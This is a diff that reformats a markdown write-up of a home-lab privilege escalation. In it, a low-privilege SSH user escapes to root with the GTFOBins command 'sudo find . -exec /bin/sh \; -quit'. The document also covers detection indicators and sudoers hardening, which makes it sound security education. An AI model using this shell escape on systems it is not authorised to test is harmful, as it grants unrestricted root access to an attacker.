@@ -35,7 +35,7 @@ Sudo is meant to let normal users run specific commands as root without giving t
 If sudo allows a user to run one of these binaries as root, the user can trigger that hidden shell escape function. Since the binary itself is running as root, the shell it spawns is also root — completely bypassing the whole point of sudo restrictions.
 
 ## Lab Setup
-```
+
 | Component        | Details                                  |
 |------------------|------------------------------------------|
 | Attacker Machine | Kali Linux                               |
@@ -43,16 +43,16 @@ If sudo allows a user to run one of these binaries as root, the user can trigger
 | Victim IP        | 192.168.5.133                            |
 | Access Method    | SSH with valid low-privilege credentials |
 | Network          | VMware Host-Only Network                 |
-```
+
 
 ## What I Needed Before Starting
-```
+
 | What                                     | Why                                            |
 |------------------------------------------|------------------------------------------------|
 | SSH credentials for a low-privilege user | Starting point for the attack                  |
 | `sudo -l` access                         | To see which commands I could run as root      |
 | GTFOBins website                         | To find the shell escape for the allowed binary|
-```
+
 
 ## What I Understood During the Process
 
@@ -92,6 +92,7 @@ Checked sudo -l as root — full (ALL) ALL access confirmed
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
 ```
+**Breakdown**
 
 - `-o HostKeyAlgorithms=+ssh-rsa` : Allows older RSA host key algorithm — needed for older Linux systems
 - `-o PubkeyAcceptedAlgorithms=+ssh-rsa` : Allows older RSA public key algorithm for authentication
@@ -175,16 +176,18 @@ GTFOBins gave me the exact command for the Sudo function of find
 find . -exec /bin/sh \; -quit
 ```
 
-- `sudo find` : Runs `find` as **root** through the `sudo` `NOPASSWD` rule.
-- `.` : Searches in the current directory. 
-- `-exec /bin/sh \;` : Executes `/bin/sh` for the first file found. Since `find` is running as **root**, the shell also runs as **root**. 
-- `-quit` : Stops after the first match so `find` does not continue searching. S
-
 ### Ran the Command
 
 ```bash
 user@debian:~$ sudo find . -exec /bin/sh \; -quit
 ```
+**Breakdown**
+
+- `sudo find` : Runs `find` as **root** through the `sudo` `NOPASSWD` rule.
+- `.` : Searches in the current directory. 
+- `-exec /bin/sh \;` : Executes `/bin/sh` for the first file found. Since `find` is running as **root**, the shell also runs as **root**. 
+- `-quit` : Stops after the first match so `find` does not continue searching.
+
 **Output:**
 
 ```
@@ -193,6 +196,7 @@ sh-4.1#
 The prompt changed from user@debian to sh-4.1# — that # symbol confirms I was now root.
 
 ## Step 4 — Confirming Full Root Access
+
 ```bash
 sh-4.1# whoami
 ```
@@ -213,27 +217,43 @@ uid=0(root) gid=0(root) groups=0(root)
 I went from a normal low privilege user straight to a fully unrestricted root account, all from one misconfigured sudo rule on the find binary.
 
 ## How Defenders Can Catch This
-```
+
 |                                            Indicator                                   |         What to look for          |
 |----------------------------------------------------------------------------------------|-----------------------------------|
 | `sudo -l` run by a non-admin user                                                      | Audit logs (`/var/log/auth.log`)  |
 | Unexpected root shell spawned from a non-root user session                             | Process monitoring (`auditd`)     |
 | Use of `find`, `vim`, `awk`, or similar tools with sudo right before a UID change to 0 | Command history and session logs  |
 | `sudoers` file containing risky `NOPASSWD` entries                                     | Regular sudoers file audits       |
-```
+
 
 ## How to Prevent It
 
-Never give sudo access to shell-capable binaries unless absolutely necessary
-Tools like `find`, `vim`, `awk`, `less`, `man`, `nmap`, and many others can spawn shells. Check every binary against GTFOBins before adding it to a sudoers rule.
-Always require a password for sudo unless there is a strong reason not to
-Avoid NOPASSWD wherever possible. It removes a critical layer of protection.
-Restrict sudo rules to exact arguments, not the whole binary
-Instead of allowing the full binary, restrict it to specific safe arguments using sudoers syntax:
+- **Never give sudo access to shell-capable binaries unless it is absolutely necessary.**
 
-```bash
-user ALL=(root) NOPASSWD: /usr/bin/find /var/log -type f
-```
+  Tools such as `find`, `vim`, `awk`, `less`, `man`, `nmap`, and many others can be used to spawn a shell. Before allowing any binary in the `sudoers` file, check whether it appears in GTFOBins.
+
+- **Require a password for sudo whenever possible.**
+
+  Avoid using `NOPASSWD` unless there is a valid business or administrative reason. Requiring a password adds an extra layer of security.
+
+- **Restrict sudo rules to specific commands and arguments.**
+
+  Instead of allowing users to run an entire binary with `sudo`, limit the rule to only the commands or arguments they actually need by using precise `sudoers` entries.
+
+ **Example:**
+
+  ```bash
+  user ALL=(root) NOPASSWD: /usr/bin/find /var/log -type f
+  ```
+  
+- **Review sudo permissions regularly.**
+
+  Periodically audit the `sudoers` file to remove unnecessary privileges and ensure users have only the permissions they require.
+
+- **Follow the principle of least privilege.**
+
+  Grant only the minimum permissions needed for users to perform their tasks. This reduces the risk of privilege escalation if an account is compromised.
+
 
 ### Audit sudoers file regularly
 
